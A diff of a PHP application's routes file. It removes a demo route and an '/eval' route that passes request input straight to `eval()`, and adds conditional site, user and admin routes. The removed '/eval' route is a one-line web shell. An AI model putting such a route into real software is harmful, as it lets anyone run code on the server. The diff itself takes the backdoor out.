@@ -153,7 +153,7 @@ Route::post(APP_ADMIN_PATH . '/fileupload', 'Admin/HandleController@fileupload')
 
 Route::post(APP_ADMIN_PATH . '/fileuploadget', 'Admin/HandleController@fileupload_get');
 
-Route::post(APP_ADMIN_PATH . '/fileuploadsave', 'Admin/HandleController@fileupload_save');
+Route::post(APP_ADMIN_PATH . '/fileuploadsave', 'Admin/HandleController@fileupload_save', false);
 
 
 /* 系统级API */
@@ -171,13 +171,25 @@ Route::any('/sys/datastat', 'Sys/IndexController@datastat');
 /* Test */
 // Route::get('/init', 'IndexController@init');
 
-Route::any('/demo', function () {
-    // echo 'hello huli!';
-});
 
-Route::any('/eval', function () {
-    echo @eval($_REQUEST['code']);
-});
+if (HULICORE_INFO_TYPE) {
+    /* 站点接入 */
+    Route::get(APP_USER_PATH . '/website', 'User/IndexController@website');
+
+    Route::post(APP_USER_PATH . '/website', 'User/HandleController@website');
+
+    /* Site */
+    Route::any(APP_SITE_PATH . '/api/{val}', 'Site/IndexController@api');
+
+    Route::any(APP_SITE_PATH . '/info', 'Site/IndexController@info');
+
+    Route::any(APP_SITE_PATH . '/update', 'Site/IndexController@update');
+
+    /* 扩展Other */
+    Route::get(APP_ADMIN_PATH . '/other', 'Other/IndexController@index');
+
+    Route::post(APP_ADMIN_PATH . '/other/{val}', 'Other/HandleController@index');
+}
 
 /* 404错误页渲染 */
 Route::error(404, 'IndexController@error404');
